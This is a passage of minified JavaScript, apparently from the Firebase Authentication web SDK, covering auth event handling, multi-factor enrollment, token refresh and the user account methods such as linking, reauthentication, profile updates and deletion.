          if (d.Wh(a.getType(), a.Ja)) {
            (b = this.Bc[a.getType()]) &&
              (b.vj(a, d),
              a &&
                (a.ae() || a.Ja) &&
                ((this.Ff[a.getUid()] = !0), (this.Tg = Date.now()))),
              (b = !0);
            break;
          }
        }
        return Aq(this.vc), b;
      }),
      (k.getRedirectResult = function () {
        return this.vc.getRedirectResult();
      }),
      (k.qe = function (a, b, c, d, e, f) {
        var g = this;
        return this.qb.qe(
          a,
          b,
          c,
          function () {
            g.td || ((g.td = !0), g.qb.Cc(g.jg));
          },
          function () {
            g.reset();
          },
          d,
          e,
          f
        );
      });
    var zq = function (a) {
      return !(!a || "auth/cordova-not-ready" != a.code);
    };
    (yq.prototype.re = function (a, b, c, d) {
      var f,
        e = this;
      return rq(this.ne).then(function () {
        return e.qb
          .re(a, b, c, d)
          .l(function (g) {
            if (zq(g))
              throw new P("operation-not-supported-in-this-environment");
            return (
              (f = g),
              sq(e.ne).then(function () {
                throw f;
              })
            );
          })
          .then(function () {
            return e.qb.Sj()
              ? new E(function () {})
              : sq(e.ne)
                  .then(function () {
                    return e.getRedirectResult();
                  })
                  .then(function () {})
                  .l(function () {});
          });
      });
    }),
      (yq.prototype.Ae = function (a, b, c, d) {
        return this.qb.Ae(
          c,
          function (e) {
            a.Tc(b, null, e, d);
          },
          Cq.get()
        );
      });
    var wq = function (a, b, c) {
        return (a = a + ":" + b), c && (a = a + ":" + c.url), a;
      },
      Eq = function (a, b, c, d) {
        var e = wq(b, c, d);
        return Dq[e] || (Dq[e] = new yq(a, b, c, d)), Dq[e];
      },
      Cq = new Dl(2e3, 1e4),
      Fq = new Dl(3e4, 6e4),
      Dq = {},
      uq = function (a) {
        (this.O = a),
          (this.Dd = null),
          (this.ve = []),
          (this.ue = []),
          (this.Cd = null),
          (this.Tj = this.we = !1);
      };
    (uq.prototype.reset = function () {
      (this.Dd = null), this.Cd && (this.Cd.cancel(), (this.Cd = null));
    }),
      (uq.prototype.vj = function (a, b) {
        if (a) {
          this.reset(), (this.we = !0);
          var c = a.getType(),
            d = a.Ja,
            e =
              a.getError() &&
              "auth/web-storage-unsupported" == a.getError().code,
            f =
              a.getError() &&
              "auth/operation-not-supported-in-this-environment" ==
                a.getError().code;
          (this.Tj = !(!e && !f)),
            "unknown" != c || e || f
              ? a.yb
                ? this.kh(a, b)
                : b.Yd(c, d)
                ? this.lh(a, b)
                : G(new P("invalid-auth-event"))
              : (Gq(this, !1, null, null), F());
        } else G(new P("invalid-auth-event"));
      });
    var Aq = function (a) {
      a.we || ((a.we = !0), Gq(a, !1, null, null));
    };
    (uq.prototype.ad = function () {
      this.we && !this.Tj && Gq(this, !1, null, null);
    }),
      (uq.prototype.kh = function (a) {
        Gq(this, !0, null, a.getError()), F();
      }),
      (uq.prototype.lh = function (a, b) {
        var c = this,
          d = a.Ja,
          e = a.getType();
        (b = b.Yd(e, d)), (d = a.Ld), (e = a.ae());
        var f = a.jh,
          g = a.ma,
          h = !!a.getType().match(/Redirect$/);
        b(d, e, g, f)
          .then(function (l) {
            Gq(c, h, l, null);
          })
          .l(function (l) {
            Gq(c, h, null, l);
          });
      });
    var Hq = function (a, b) {
        if (
          ((a.Dd = function () {
            return G(b);
          }),
          a.ue.length)
        )
          for (var c = 0; c < a.ue.length; c++) a.ue[c](b);
      },
      Iq = function (a, b) {
        if (
          ((a.Dd = function () {
            return F(b);
          }),
          a.ve.length)
        )
          for (var c = 0; c < a.ve.length; c++) a.ve[c](b);
      },
      Gq = function (a, b, c, d) {
        b ? (d ? Hq(a, d) : Iq(a, c)) : Iq(a, { user: null }),
          (a.ve = []),
          (a.ue = []);
      };
    uq.prototype.getRedirectResult = function () {
      var a = this;
      return new E(function (b, c) {
        a.Dd ? a.Dd().then(b, c) : (a.ve.push(b), a.ue.push(c), Jq(a));
      });
    };
    var Jq = function (a) {
        var b = new P("timeout");
        a.Cd && a.Cd.cancel(),
          (a.Cd = ik(Fq.get()).then(function () {
            a.Dd || ((a.we = !0), Gq(a, !0, null, b));
          }));
      },
      vq = function (a) {
        this.O = a;
      };
    (vq.prototype.vj = function (a, b) {
      if (a) {
        var c = a.getType(),
          d = a.Ja;
        a.yb
          ? this.kh(a, b)
          : b.Yd(c, d)
          ? this.lh(a, b)
          : G(new P("invalid-auth-event"));
      } else G(new P("invalid-auth-event"));
    }),
      (vq.prototype.kh = function (a, b) {
        var c = a.Ja,
          d = a.getType();
        b.Tc(d, null, a.getError(), c), F();
      }),
      (vq.prototype.lh = function (a, b) {
        var c = a.Ja,
          d = a.getType();
        b.Yd(d, c)(a.Ld, a.ae(), a.ma, a.jh)
          .then(function (h) {
            b.Tc(d, h, null, c);
          })
          .l(function (h) {
            b.Tc(d, null, h, c);
          });
      });
    var Kq = function (a, b, c) {
      var d = b && b.mfaPendingCredential;
      if (!d)
        throw new P(
          "argument-error",
          "Internal assert: Invalid MultiFactorResolver"
        );
      (this.Me = a),
        (this.Dk = Za(b)),
        (this.Gl = c),
        (this.Fj = new om(null, d)),
        (this.Fi = []);
      var e = this;
      x(b.mfaInfo || [], function (f) {
        (f = dm(f)) && e.Fi.push(f);
      }),
        O(this, "auth", this.Me),
        O(this, "session", this.Fj),
        O(this, "hints", this.Fi);
    };
    Kq.prototype.resolveSignIn = function (a) {
      var b = this;
      return a.process(this.Me.o, this.Fj).then(function (c) {
        var d = Za(b.Dk);
        return (
          delete d.mfaInfo, delete d.mfaPendingCredential, ab(d, c), b.Gl(d)
        );
      });
    };
    var Lq = function (a, b, c, d) {
      P.call(this, "multi-factor-auth-required", d, b),
        (this.Xl = new Kq(a, b, c)),
        O(this, "resolver", this.Xl);
    };
    n(Lq, P);
    var Mq = function (a, b, c) {
        if (
          a &&
          t(a.serverResponse) &&
          "auth/multi-factor-auth-required" === a.code
        )
          try {
            return new Lq(b, a.serverResponse, c, a.message);
          } catch (d) {}
        return null;
      },
      Nq = function () {};
    Nq.prototype.process = function (a, b, c) {
      return "enroll" == b.type ? Oq(this, a, b, c) : Pq(this, a, b);
    };
    var Oq = function (a, b, c, d) {
        return c.Zd().then(function (e) {
          return (
            (e = { idToken: e }),
            void 0 !== d && (e.displayName = d),
            ab(e, { phoneVerificationInfo: Tm(a.Wg) }),
            Q(b, ho, e)
          );
        });
      },
      Pq = function (a, b, c) {
        return c.Zd().then(function (d) {
          return (
            ab((d = { mfaPendingCredential: d }), {
              phoneVerificationInfo: Tm(a.Wg),
            }),
            Q(b, io, d)
          );
        });
      },
      Qq = function (a) {
        O(this, "factorId", a.providerId), (this.Wg = a);
      };
    v(Qq, Nq);
    var Rq = function (a) {
      if ((Qq.call(this, a), this.Wg.providerId != Xm.PROVIDER_ID))
        throw new P(
          "argument-error",
          "firebase.auth.PhoneMultiFactorAssertion requires a valid firebase.auth.PhoneAuthCredential"
        );
    };
    v(Rq, Qq);
    var Sq = function (a, b) {
      for (var c in (Zi.call(this, a), b)) this[c] = b[c];
    };
    n(Sq, Zi);
    var Uq = function (a, b) {
        (this.jc = a),
          (this.Ue = []),
          (this.wm = u(this.dl, this)),
          nj(this.jc, "userReloaded", this.wm);
        var c = [];
        b &&
          b.multiFactor &&
          b.multiFactor.enrolledFactors &&
          x(b.multiFactor.enrolledFactors, function (d) {
            var e = null,
              f = {};
            if (d) {
              if (
                (d.uid && (f.mfaEnrollmentId = d.uid),
                d.displayName && (f.displayName = d.displayName),
                d.enrollmentTime &&
                  (f.enrolledAt = new Date(d.enrollmentTime).toISOString()),
                d.phoneNumber)
              ) {
                f.phoneInfo = d.phoneNumber;
                try {
                  e = new bm(f);
                } catch (g) {}
              } else if (d.totpInfo) {
                f.totpInfo = d.totpInfo;
                try {
                  e = new cm(f);
                } catch (g) {}
              } else e = null;
              d = e;
            } else d = null;
            d && c.push(d);
          }),
          Tq(this, c);
      },
      Vq = function (a) {
        var b = [];
        return (
          x(a.mfaInfo || [], function (c) {
            (c = dm(c)) && b.push(c);
          }),
          b
        );
      };
    Uq.prototype.dl = function (a) {
      Tq(this, Vq(a.xm));
    };
    var Tq = function (a, b) {
      (a.Ue = b), O(a, "enrolledFactors", b);
    };
    (k = Uq.prototype),
      (k.copy = function (a) {
        Tq(this, a.Ue);
      }),
      (k.getSession = function () {
        return this.jc.getIdToken().then(function (a) {
          return new om(a, null);
        });
      }),
      (k.enroll = function (a, b) {
        var c = this,
          d = this.jc.o;
        return this.getSession()
          .then(function (e) {
            return a.process(d, e, b);
          })
          .then(function (e) {
            return Wq(c.jc, e), c.jc.reload();
          });
      }),
      (k.unenroll = function (a) {
        var b = this,
          c = "string" == typeof a ? a : a.uid,
          d = this.jc.o;
        return this.jc
          .getIdToken()
          .then(function (e) {
            return Q(d, mo, { idToken: e, mfaEnrollmentId: c });
          })
          .then(function (e) {
            var f = Na(b.Ue, function (g) {
              return g.uid != c;
            });
            return (
              Tq(b, f),
              Wq(b.jc, e),
              b.jc.reload().l(function (g) {
                if ("auth/user-token-expired" != g.code) throw g;
              })
            );
          });
      }),
      (k.T = function () {
        return {
          multiFactor: {
            enrolledFactors: Oa(this.Ue, function (a) {
              return a.T();
            }),
          },
        };
      });
    var Xq = function (a) {
      (this.o = a), (this.Wa = this.Ta = null), (this.kd = Date.now());
    };
    Xq.prototype.T = function () {
      return {
        apiKey: this.o.ha,
        refreshToken: this.Ta,
        accessToken: this.Wa && this.Wa.toString(),
        expirationTime: this.kd,
      };
    };
    var Yq = function (a, b) {
        void 0 === b && (a.Wa ? (b = (b = a.Wa).Dg - b.jl) : (b = 0)),
          (a.kd = Date.now() + 1e3 * b);
      },
      Zq = function (a, b) {
        (a.Wa = mm(b.idToken || "")),
          (a.Ta = b.refreshToken),
          (b = b.expiresIn),
          Yq(a, void 0 !== b ? Number(b) : void 0);
      };
    Xq.prototype.copy = function (a) {
      (this.Wa = a.Wa), (this.Ta = a.Ta), (this.kd = a.kd);
    };
    var $q = function (a, b) {
      return wn(a.o, b)
        .then(function (c) {
          return (
            (a.Wa = mm(c.access_token)),
            (a.Ta = c.refresh_token),
            Yq(a, c.expires_in),
            { accessToken: a.Wa.toString(), refreshToken: a.Ta }
          );
        })
        .l(function (c) {
          throw ("auth/user-token-expired" == c.code && (a.Ta = null), c);
        });
    };
    Xq.prototype.getToken = function (a) {
      return (
        (a = !!a),
        this.Wa && !this.Ta
          ? G(new P("user-token-expired"))
          : a || !this.Wa || Date.now() > this.kd - 3e4
          ? this.Ta
            ? $q(this, { grant_type: "refresh_token", refresh_token: this.Ta })
            : F(null)
          : F({ accessToken: this.Wa.toString(), refreshToken: this.Ta })
      );
    };
    var ar = function (a, b) {
      (this.ci = a || null),
        (this.Si = b || null),
        Pl(this, {
          lastSignInTime: Hl(b || null),
          creationTime: Hl(a || null),
        });
    };
    (ar.prototype.clone = function () {
      return new ar(this.ci, this.Si);
    }),
      (ar.prototype.T = function () {
        return { lastLoginAt: this.Si, createdAt: this.ci };
      });
    var br = function (a, b, c, d, e, f) {
        Pl(this, {
          uid: a,
          displayName: d || null,
          photoURL: e || null,
          email: c || null,
          phoneNumber: f || null,
          providerId: b,
        });
      },
      R = function (a, b, c) {
        yj.call(this),
          (this.Ka = []),
          (this.ha = a.apiKey),
          (this.ka = a.appName),
          (this.ya = a.authDomain || null);
        var d = firebase.SDK_VERSION
          ? sl("JsCore", firebase.SDK_VERSION)
          : null;
        (this.o = new mn(this.ha, Tk(Uk), d)),
          (this.N = a.emulatorConfig || null) && qn(this.o, this.N),
          (this.Nb = new Xq(this.o)),
          cr(this, b.idToken),
          Zq(this.Nb, b),
          O(this, "refreshToken", this.Nb.Ta),
          dr(this, c || {}),
          (this.oe = !1),
          this.ya && wl() && (this.W = Eq(this.ya, this.ha, this.ka, this.N)),
          (this.Pf = []),
          (this.Ob = null),
          (this.Ad = er(this)),
          (this.Nd = u(this.Kg, this));
        var e = this;
        (this.Gb = null),
          (this.hj = function (f) {
            e.Gd(f.languageCode);
          }),
          (this.Rg = null),
          (this.ej = function (f) {
            fr(e, f.emulatorConfig);
          }),
          (this.yg = null),
          (this.Ea = []),
          (this.fj = function (f) {
            gr(e, f.Lk);
          }),
          (this.Eg = null),
          (this.wf = new Uq(this, c)),
          O(this, "multiFactor", this.wf);
      };
    n(R, yj),
      (R.prototype.Gd = function (a) {
        (this.Gb = a), on(this.o, a);
      });
    var fr = function (a, b) {
        (a.N = b),
          qn(a.o, b),
          a.W &&
            ((b = a.W),
            (a.W = Eq(a.ya, a.ha, a.ka, a.N)),
            a.oe && (b.unsubscribe(a), a.W.subscribe(a)));
      },
      hr = function (a, b) {
        a.Rg && vj(a.Rg, "languageCodeChanged", a.hj),
          (a.Rg = b) && nj(b, "languageCodeChanged", a.hj);
      },
      ir = function (a, b) {
        a.yg && vj(a.yg, "emulatorConfigChanged", a.ej),
          (a.yg = b) && nj(b, "emulatorConfigChanged", a.ej);
      },
      gr = function (a, b) {
        (a.Ea = b),
          rn(
            a.o,
            firebase.SDK_VERSION
              ? sl("JsCore", firebase.SDK_VERSION, a.Ea)
              : null
          );
      },
      jr = function (a, b) {
        a.Eg && vj(a.Eg, "frameworkChanged", a.fj),
          (a.Eg = b) && nj(b, "frameworkChanged", a.fj);
      };
    R.prototype.Kg = function () {
      this.Ad.xd && (this.Ad.stop(), this.Ad.start());
    };
    var kr = function (a) {
        try {
          return firebase.app(a.ka).auth();
        } catch (b) {
          throw new P(
            "internal-error",
            "No firebase.auth.Auth instance is available for the Firebase App '" +
              a.ka +
              "'!"
          );
        }
      },
      er = function (a) {
        return new Fp(
          function () {
            return a.getIdToken(!0);
          },
          function (b) {
            return !(!b || "auth/network-request-failed" != b.code);
          },
          function () {
            var b = a.Nb.kd - Date.now() - 3e5;
            return 0 < b ? b : 0;
          }
        );
      },
      lr = function (a) {
        a.jd ||
          a.Ad.xd ||
          (a.Ad.start(),
          vj(a, "tokenChanged", a.Nd),
          nj(a, "tokenChanged", a.Nd));
      },
      mr = function (a) {
        vj(a, "tokenChanged", a.Nd), a.Ad.stop();
      },
      cr = function (a, b) {
        (a.Ri = b), O(a, "_lat", b);
      },
      nr = function (a, b) {
        Ta(a.Pf, function (c) {
          return c == b;
        });
      },
      or = function (a) {
        for (var b = [], c = 0; c < a.Pf.length; c++) b.push(a.Pf[c](a));
        return tg(b).then(function () {
          return a;
        });
      },
      pr = function (a) {
        a.W && !a.oe && ((a.oe = !0), a.W.subscribe(a));
      },
      dr = function (a, b) {
        Pl(a, {
          uid: b.uid,
          displayName: b.displayName || null,
          photoURL: b.photoURL || null,
          email: b.email || null,
          emailVerified: b.emailVerified || !1,
          phoneNumber: b.phoneNumber || null,
          isAnonymous: b.isAnonymous || !1,
          tenantId: b.tenantId || null,
          metadata: new ar(b.createdAt, b.lastLoginAt),
          providerData: [],
        }),
          (a.o.ma = a.tenantId);
      },
      qr = function () {},
      rr = function (a) {
        return F().then(function () {
          if (a.jd) throw new P("app-deleted");
        });
      },
      sr = function (a) {
        return Oa(a.providerData, function (b) {
          return b.providerId;
        });
      },
      ur = function (a, b) {
        b && (tr(a, b.providerId), a.providerData.push(b));
      },
      tr = function (a, b) {
        Ta(a.providerData, function (c) {
          return c.providerId == b;
        });
      },
      vr = function (a, b, c) {
        ("uid" != b || c) && a.hasOwnProperty(b) && O(a, b, c);
      };
    (R.prototype.copy = function (a) {
      var b = this;
      b != a &&
        (Pl(this, {
          uid: a.uid,
          displayName: a.displayName,
          photoURL: a.photoURL,
          email: a.email,
          emailVerified: a.emailVerified,
          phoneNumber: a.phoneNumber,
          isAnonymous: a.isAnonymous,
          tenantId: a.tenantId,
          providerData: [],
        }),
        a.metadata
          ? O(this, "metadata", a.metadata.clone())
          : O(this, "metadata", new ar()),
        x(a.providerData, function (c) {
          ur(b, c);
        }),
        this.Nb.copy(a.Nb),
        O(this, "refreshToken", this.Nb.Ta),
        this.wf.copy(a.wf));
    }),
      (R.prototype.reload = function () {
        var a = this;
        return this.v(
          rr(this).then(function () {
            return wr(a)
              .then(function () {
                return or(a);
              })
              .then(qr);
          })
        );
      });
    var wr = function (a) {
      return a.getIdToken().then(function (b) {
        var c = a.isAnonymous;
        return Q(a.o, jo, { idToken: b })
          .then(u(a.Ll, a))
          .then(function () {
            return c || vr(a, "isAnonymous", !1), b;
          });
      });
    };
    (R.prototype.getIdTokenResult = function (a) {
      return this.getIdToken(a).then(function (b) {
        return new nm(b);
      });
    }),
      (R.prototype.getIdToken = function (a) {
        var b = this;
        return this.v(
          rr(this)
            .then(function () {
              return b.Nb.getToken(a);
            })
            .then(function (c) {
              if (!c) throw new P("internal-error");
              return (
                c.accessToken != b.Ri && (cr(b, c.accessToken), b.rc()),
                vr(b, "refreshToken", c.refreshToken),
                c.accessToken
              );
            })
        );
      });
    var Wq = function (a, b) {
      b.idToken &&
        a.Ri != b.idToken &&
        (Zq(a.Nb, b), a.rc(), cr(a, b.idToken), vr(a, "refreshToken", a.Nb.Ta));
    };
    (R.prototype.rc = function () {
      this.dispatchEvent(new Sq("tokenChanged"));
    }),
      (R.prototype.Ll = function (a) {
        if (!(a = a.users) || !a.length) throw new P("internal-error");
        (a = a[0]),
          dr(this, {
            uid: a.localId,
            displayName: a.displayName,
            photoURL: a.photoUrl,
            email: a.email,
            emailVerified: !!a.emailVerified,
            phoneNumber: a.phoneNumber,
            lastLoginAt: a.lastLoginAt,
            createdAt: a.createdAt,
            tenantId: a.tenantId,
          });
        for (var b = xr(a), c = 0; c < b.length; c++) ur(this, b[c]);
        vr(
          this,
          "isAnonymous",
          !(
            (this.email && a.passwordHash) ||
            (this.providerData && this.providerData.length)
          )
        ),
          this.dispatchEvent(new Sq("userReloaded", { xm: a }));
      });
    var xr = function (a) {
      return (a = a.providerUserInfo) && a.length
        ? Oa(a, function (b) {
            return new br(
              b.rawId,
              b.providerId,
              b.email,
              b.displayName,
              b.photoUrl,
              b.phoneNumber
            );
          })
        : [];
    };
    (R.prototype.reauthenticateAndRetrieveDataWithCredential = function (a) {
      return (
        Ml(
          "firebase.User.prototype.reauthenticateAndRetrieveDataWithCredential is deprecated. Please use firebase.User.prototype.reauthenticateWithCredential instead."
        ),
        this.reauthenticateWithCredential(a)
      );
    }),
      (R.prototype.reauthenticateWithCredential = function (a) {
        var b = this,
          c = null;
        return this.v(
          a
            .ke(this.o, this.uid)
            .then(function (d) {
              return (
                Wq(b, d),
                (c = yr(b, d, "reauthenticate")),
                (b.Ob = null),
                b.reload()
              );
            })
            .then(function () {
              return c;
            }),
          !0
        );
      });
    var zr = function (a, b) {
      return wr(a).then(function () {
        if (Qa(sr(a), b))
          return or(a).then(function () {
            throw new P("provider-already-linked");
          });
      });
    };
    (R.prototype.linkAndRetrieveDataWithCredential = function (a) {
      return (
        Ml(
          "firebase.User.prototype.linkAndRetrieveDataWithCredential is deprecated. Please use firebase.User.prototype.linkWithCredential instead."
        ),
        this.linkWithCredential(a)
      );
    }),
      (R.prototype.linkWithCredential = function (a) {
        var b = this,
          c = null;
        return this.v(
          zr(this, a.providerId)
            .then(function () {
              return b.getIdToken();
            })
            .then(function (d) {
              return a.ud(b.o, d);
            })
            .then(function (d) {
              return (c = yr(b, d, "link")), Ar(b, d);
            })
            .then(function () {
              return c;
            })
        );
      }),
      (R.prototype.linkWithPhoneNumber = function (a, b) {
        var c = this;
        return this.v(
          zr(this, "phone").then(function () {
            return Ep(kr(c), a, b, u(c.linkWithCredential, c));
          })
        );
      }),
      (R.prototype.reauthenticateWithPhoneNumber = function (a, b) {
        var c = this;
        return this.v(
          F().then(function () {
            return Ep(kr(c), a, b, u(c.reauthenticateWithCredential, c));
          }),
          !0
        );
      });
    var yr = function (a, b, c) {
        var d = bn(b);
        return (
          (b = Op(b)),
          Ql({
            user: a,
            credential: d,
            additionalUserInfo: b,
            operationType: c,
          })
        );
      },
      Ar = function (a, b) {
        return (
          Wq(a, b),
          a.reload().then(function () {
            return a;
          })
        );
      };
    (k = R.prototype),
      (k.updateEmail = function (a) {
        var b = this;
        return this.v(
          this.getIdToken()
            .then(function (c) {
              return b.o.updateEmail(c, a);
            })
            .then(function (c) {
              return Wq(b, c), b.reload();
            })
        );
      }),
      (k.updatePhoneNumber = function (a) {
        var b = this;
        return this.v(
          this.getIdToken()
            .then(function (c) {
              return a.ud(b.o, c);
            })
            .then(function (c) {
              return Wq(b, c), b.reload();
            })
        );
      }),
      (k.updatePassword = function (a) {
        var b = this;
        return this.v(
          this.getIdToken()
            .then(function (c) {
              return b.o.updatePassword(c, a);
            })
            .then(function (c) {
              return Wq(b, c), b.reload();
            })
        );
      }),
      (k.updateProfile = function (a) {
        if (void 0 === a.displayName && void 0 === a.photoURL) return rr(this);
        var b = this;
        return this.v(
          this.getIdToken()
            .then(function (c) {
              return b.o.updateProfile(c, {
                displayName: a.displayName,
                photoUrl: a.photoURL,
              });
            })
            .then(function (c) {
              return (
                Wq(b, c),
                vr(b, "displayName", c.displayName || null),
                vr(b, "photoURL", c.photoUrl || null),
                x(b.providerData, function (d) {
                  "password" === d.providerId &&
                    (O(d, "displayName", b.displayName),
                    O(d, "photoURL", b.photoURL));
                }),
                or(b)
              );
            })
            .then(qr)
        );
      }),
      (k.unlink = function (a) {
        var b = this;
        return this.v(
          wr(this).then(function (c) {
            return Qa(sr(b), a)
              ? Tn(b.o, c, [a]).then(function (d) {
                  var e = {};
                  return (
                    x(d.providerUserInfo || [], function (f) {
                      e[f.providerId] = !0;
                    }),
                    x(sr(b), function (f) {
                      e[f] || tr(b, f);
                    }),
                    e[Xm.PROVIDER_ID] || O(b, "phoneNumber", null),
                    or(b)
                  );
                })
              : or(b).then(function () {
                  throw new P("no-such-provider");
                });
          })
        );
      }),
      (k.delete = function () {
        var a = this;
        return this.v(
          this.getIdToken()
            .then(function (b) {
              return Q(a.o, go, { idToken: b });
            })
            .then(function () {
              a.dispatchEvent(new Sq("userDeleted"));
            })
        ).then(function () {
          a.destroy();
        });
      }),
      (k.Wh = function (a, b) {
        return !!(
          ("linkViaPopup" == a && (this.Kb || null) == b && this.Jb) ||
          ("reauthViaPopup" == a && (this.Kb || null) == b && this.Jb) ||
          ("linkViaRedirect" == a && (this.wc || null) == b) ||
          ("reauthViaRedirect" == a && (this.wc || null) == b)
        );
      }),
      (k.Tc = function (a, b, c, d) {
        ("linkViaPopup" != a && "reauthViaPopup" != a) ||
          d != (this.Kb || null) ||
          (c && this.Rc ? this.Rc(c) : b && !c && this.Jb && this.Jb(b),
          this.La && (this.La.cancel(), (this.La = null)),
          delete this.Jb,
          delete this.Rc);
      }),
      (k.Yd = function (a, b) {
        return "linkViaPopup" == a && b == (this.Kb || null)
          ? u(this.ni, this)
          : "reauthViaPopup" == a && b == (this.Kb || null)
          ? u(this.oi, this)
          : "linkViaRedirect" == a && (this.wc || null) == b
          ? u(this.ni, this)
          : "reauthViaRedirect" == a && (this.wc || null) == b
          ? u(this.oi, this)
          : null;
      }),
      (k.Xe = function () {
        return tl(this.uid + ":::");
      }),
      (k.linkWithPopup = function (a) {
        var b = this;
        return Br(
          this,
          "linkViaPopup",
          a,
          function () {
            return zr(b, a.providerId).then(function () {
              return or(b);
            });
          },
          !1
        );
      }),
      (k.reauthenticateWithPopup = function (a) {
        return Br(
          this,
          "reauthViaPopup",
          a,
          function () {
            return F();
          },
          !0
        );
      });
    var Br = function (a, b, c, d, e) {
      if (!wl()) return G(new P("operation-not-supported-in-this-environment"));
      if (a.Ob && !e) return G(a.Ob);
      var f = Wl(c.providerId),
        g = a.Xe(),
        h = null;
      (!xl() || ml()) &&
        a.ya &&
        c.isOAuthProvider &&
        (h = Bo(
          a.ya,
          a.ha,
          a.ka,
          b,
          c,
          null,
          g,
          firebase.SDK_VERSION || null,
          null,
          null,
          a.tenantId,
          a.N
        ));
      var l = dl(h, f && f.zd, f && f.yd);
      return (
        (d = d()
          .then(function () {
            if ((Cr(a), !e)) return a.getIdToken().then(function () {});
          })
          .then(function () {
            return a.W.qe(l, b, c, g, !!h, a.tenantId);
          })
          .then(function () {
            return new E(function (m, q) {
              a.Tc(b, null, new P("cancelled-popup-request"), a.Kb || null),
                (a.Jb = m),
                (a.Rc = q),
                (a.Kb = g),
                (a.La = a.W.Ae(a, b, l, g));
            });
          })
          .then(function (m) {
            return l && cl(l), m ? Ql(m) : null;
          })
          .l(function (m) {
            throw (l && cl(l), m);
          })),
        a.v(d, e)
      );
    };
    (R.prototype.linkWithRedirect = function (a) {
      var b = this;
      return Dr(
        this,
        "linkViaRedirect",
        a,
        function () {
          return zr(b, a.providerId);
        },
        !1
      );
    }),
      (R.prototype.reauthenticateWithRedirect = function (a) {
        return Dr(
          this,
          "reauthViaRedirect",
          a,
          function () {
            return F();
          },
          !0
        );
      });
    var Dr = function (a, b, c, d, e) {
        if (!wl())
          return G(new P("operation-not-supported-in-this-environment"));
        if (a.Ob && !e) return G(a.Ob);
        var f = null,
          g = a.Xe();
        return (
          (d = d()
            .then(function () {
              if ((Cr(a), !e)) return a.getIdToken().then(function () {});
            })
            .then(function () {
              return (a.wc = g), or(a);
            })
            .then(function (h) {
              return a.xc && (h = (h = a.xc).O.set(Er, a.T(), h.V)), h;
            })
            .then(function () {
              return a.W.re(b, c, g, a.tenantId);
            })
            .l(function (h) {
              if (((f = h), a.xc)) return Fr(a.xc);
              throw f;
            })
            .then(function () {
              if (f) throw f;
            })),
          a.v(d, e)
        );
      },
      Cr = function (a) {
        if (!a.W || !a.oe) {
          if (a.W && !a.oe) throw new P("internal-error");
          throw new P("auth-domain-config-required");
        }
      };
    (k = R.prototype),
      (k.ni = function (a, b, c, d) {
        var e = this;
        this.La && (this.La.cancel(), (this.La = null));
        var f = null;
        return (
          (c = this.getIdToken()
            .then(function (g) {
              return tm(e.o, {
                requestUri: a,
                postBody: d,
                sessionId: b,
                idToken: g,
              });
            })
            .then(function (g) {
              return (f = yr(e, g, "link")), Ar(e, g);
            })
            .then(function () {
              return f;
            })),
          this.v(c)
        );
      }),
      (k.oi = function (a, b, c, d) {
        var e = this;
        this.La && (this.La.cancel(), (this.La = null));
        var f = null,
          g = F()
            .then(function () {
              return qm(
                um(e.o, {
                  requestUri: a,
                  sessionId: b,
                  postBody: d,
                  tenantId: c,
                }),
                e.uid
              );
            })
            .then(function (h) {
              return (
                (f = yr(e, h, "reauthenticate")),
                Wq(e, h),
                (e.Ob = null),
                e.reload()
              );
            })
            .then(function () {
              return f;
            });
        return this.v(g, !0);
      }),
      (k.sendEmailVerification = function (a) {
        var b = this,
          c = null;
        return this.v(
          this.getIdToken()
            .then(function (d) {
              return (c = d), void 0 === a || Ya(a) ? {} : Cp(new Bp(a));
            })
            .then(function (d) {
              return b.o.sendEmailVerification(c, d);
            })
            .then(function (d) {
              if (b.email != d) return b.reload();
            })
            .then(function () {})
        );
      }),
      (k.verifyBeforeUpdateEmail = function (a, b) {
        var c = this,
          d = null;
        return this.v(
          this.getIdToken()
            .then(function (e) {
              return (d = e), void 0 === b || Ya(b) ? {} : Cp(new Bp(b));
            })
            .then(function (e) {
              return c.o.verifyBeforeUpdateEmail(d, a, e);
            })
            .then(function (e) {
              if (c.email != e) return c.reload();
            })
            .then(function () {})
        );
      }),
      (k.destroy = function () {
        for (var a = 0; a < this.Ka.length; a++)
          this.Ka[a].cancel("app-deleted");
        hr(this, null),
          ir(this, null),
          jr(this, null),
          (this.Ka = []),
          (this.jd = !0),
          mr(this),
          O(this, "refreshToken", null),
          this.W && this.W.unsubscribe(this);
      }),
      (k.v = function (a, b) {
        var c = this,
          d = Gr(this, a, b);
        return (
          this.Ka.push(d),
          d.Ac(function () {
            Ra(c.Ka, d);
          }),
          d.l(function (e) {
            var f = null;
            throw (
              (e &&
                "auth/multi-factor-auth-required" === e.code &&
                (f = Mq(e.T(), kr(c), u(c.Jg, c))),
              f || e)
            );
          })
        );
      }),
      (k.Jg = function (a) {
        var b = null,
          c = this;
        return (
          (a = qm(F(a), c.uid)
            .then(function (d) {
              return (
                (b = yr(c, d, "reauthenticate")),
                Wq(c, d),
                (c.Ob = null),
                c.reload()
              );
            })
            .then(function () {
              return b;
            })),
          this.v(a, !0)
        );
      });
    var Gr = function (a, b, c) {
      return a.Ob && !c
        ? (b.cancel(), G(a.Ob))
        : b.l(function (d) {
            throw (
              (!d ||
                ("auth/user-disabled" != d.code &&
                  "auth/user-token-expired" != d.code) ||
                (a.Ob || a.dispatchEvent(new Sq("userInvalidated")),
                (a.Ob = d)),
              d)
            );
          });
    };
    (R.prototype.toJSON = function () {
      return this.T();
    }),
      (R.prototype.T = function () {
        var a = {
          uid: this.uid,
          displayName: this.displayName,
          photoURL: this.photoURL,
          email: this.email,
          emailVerified: this.emailVerified,
          phoneNumber: this.phoneNumber,
          isAnonymous: this.isAnonymous,
          tenantId: this.tenantId,
          providerData: [],
          apiKey: this.ha,
          appName: this.ka,
          authDomain: this.ya,
          stsTokenManager: this.Nb.T(),
          redirectEventId: this.wc || null,
        };
        return (
          this.metadata && ab(a, this.metadata.T()),
          x(this.providerData, function (b) {
            var f,
              c = a.providerData,
              d = c.push,
              e = {};
            for (f in b) b.hasOwnProperty(f) && (e[f] = b[f]);
            d.call(c, e);
          }),
          ab(a, this.wf.T()),
          a
        );
      });
    var Hr = function (a) {
        if (!a.apiKey) return null;
        var b = {
            apiKey: a.apiKey,
            authDomain: a.authDomain,
            appName: a.appName,
            emulatorConfig: a.emulatorConfig,
          },
          c = {};
        if (!a.stsTokenManager || !a.stsTokenManager.accessToken) return null;
        (c.idToken = a.stsTokenManager.accessToken),
          (c.refreshToken = a.stsTokenManager.refreshToken || null);
        var d = a.stsTokenManager.expirationTime;
        d && (c.expiresIn = (d - Date.now()) / 1e3);
        var e = new R(b, c, a);
        return (
          a.providerData &&
            x(a.providerData, function (f) {
              f && ur(e, Ql(f));
            }),
